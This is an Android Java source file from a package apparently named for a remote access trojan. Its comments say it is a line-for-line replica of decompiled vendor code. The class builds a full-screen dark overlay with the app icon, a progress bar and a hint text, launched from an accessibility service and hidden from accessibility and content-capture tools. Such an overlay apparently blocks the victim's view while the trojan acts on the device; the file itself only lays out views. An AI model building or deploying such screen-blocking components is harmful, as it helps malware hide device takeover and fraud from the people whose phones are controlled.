package com.vendor.rat.helper;

import android.graphics.Color;
import android.os.Build;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.vendor.rat.service.MyAccessibilityService;

import java.lang.ref.WeakReference;
import java.util.Objects;

/**
 * Vendor: e0.i (内容层, 83行) — 一比一复刻
 *
 * 半透明黑色背景 Color.argb(0.6f, 0, 0, 0)
 * 包含:
 *   1. 应用图标 (e0.c) — tag="waiting-icon-image"
 *   2. 进度条 (e0.f) — tag="waiting-progress-bar"
 *   3. 提示文字 (TextView) — tag="waiting-hint-text"
 *
 * WeakReference f313a 指向进度条 (用于 sendProgress 链路)
 *
 * onLayout: 自定义布局
 *   - 图标: 居中偏上, 宽度40%, 高度160px
 *   - 进度条: 垂直居中, 高度20px
 *   - 文字: 居中偏下, 高度200px
 */
public final class BlockOverlayInner extends LinearLayout {

    // vendor: f313a — WeakReference 指向进度条
    public WeakReference<View> f313a;

    /**
     * vendor: e0.i 构造器 (行 20-53)
     */
    public BlockOverlayInner(MyAccessibilityService service, String hint) {
        super(service);

        // vendor 行 22-23
        setOrientation(VERTICAL);
        setGravity(17); // CENTER

        // vendor 行 24
        setSystemUiVisibility(4); // SYSTEM_UI_FLAG_FULLSCREEN

        // vendor 行 25
        setImportantForAccessibility(2); // IMPORTANT_FOR_ACCESSIBILITY_NO

        // vendor 行 26-28
        if (Build.VERSION.SDK_INT >= 30) {
            setImportantForContentCapture(2);
        }

        // vendor 行 29: Color.argb(0.6f, 0.0f, 0.0f, 0.0f)
        // Color.argb(float) 在 API 26+, 0.6f alpha = 153/255
        setBackgroundColor(Color.argb(153, 0, 0, 0));

        // vendor 行 30-35: 应用图标 (e0.c)
        android.widget.ImageView iconView = new android.widget.ImageView(service);
        try {
            android.graphics.drawable.Drawable appIcon = service.getPackageManager()
                .getApplicationIcon(service.getPackageName());
            if (appIcon != null) {
                iconView.setImageDrawable(appIcon);
            }
        } catch (Exception ignored) {}
        iconView.setTag("waiting-icon-image");
        addView(iconView, 0);

        // vendor 行 36-39: 进度条 (e0.f)
        View progressBar = new BlockProgressBar(service);
        addView(progressBar, 1);
        progressBar.setTag("waiting-progress-bar");
        this.f313a = new WeakReference<>(progressBar);

        // vendor 行 40-53: 提示文字
        if (hint != null && !hint.isEmpty()) {
            TextView textView = new TextView(service);
            textView.setTag("waiting-hint-text");
            textView.setText(hint);
            textView.setSingleLine(false);
            textView.setTextColor(-1); // white
            textView.setBackgroundColor(0); // transparent
            textView.setTextSize(15.0f);
            textView.setTextAlignment(TEXT_ALIGNMENT_CENTER); // vendor: 4
            textView.setGravity(17); // CENTER
            textView.setPadding(0, 10, 0, 10);
            addView(textView, 2);
        }
    }

    /**
     * vendor: e0.i onLayout (行 57-82)
     * 自定义布局: 图标居中偏上, 进度条居中, 文字居中偏下
     *
     * vendor 精确计算:
     *   centerY = ((b - t) / 2) + t
     *   icon: margin = (width - width*0.4) / 2, top = centerY - 160 - 10 - 50, height = 160
     *   progress: top = centerY - 10, height = 20
     *   text: top = centerY + 10 + 50, height = 200
     */
    @Override
    public final void onLayout(boolean changed, int l, int t, int r, int b) {
        int childCount = getChildCount();
        if (childCount > 0) {
            // vendor: centerY = ((b - t) / 2) + t
            int centerY = ((b - t) / 2) + t;

            for (int i = 0; i < childCount; i++) {
                View child = getChildAt(i);

                if (Objects.equals(child.getTag(), "waiting-icon-image")) {
                    // vendor 行 66-69
                    int totalWidth = r - l;
                    int iconWidth = (int) (totalWidth * 0.4f);
                    int margin = (totalWidth - iconWidth) / 2;
                    int iconTop = centerY - 160 - 10 - 50;
                    // vendor: height = CipherSuite.TLS_DH_RSA_WITH_AES_128_GCM_SHA256 = 160
                    child.layout(margin, iconTop, r - margin, iconTop + 160);
                } else if (Objects.equals(child.getTag(), "waiting-progress-bar")) {
                    // vendor 行 71-73
                    int top = centerY - 10;
                    child.layout(l, top, r, top + 20);
                } else {
                    // vendor 行 74-76: hint text
                    int top = centerY + 10 + 50;
                    child.layout(l, top, r, top + 200);
                }
            }
        }
    }
}
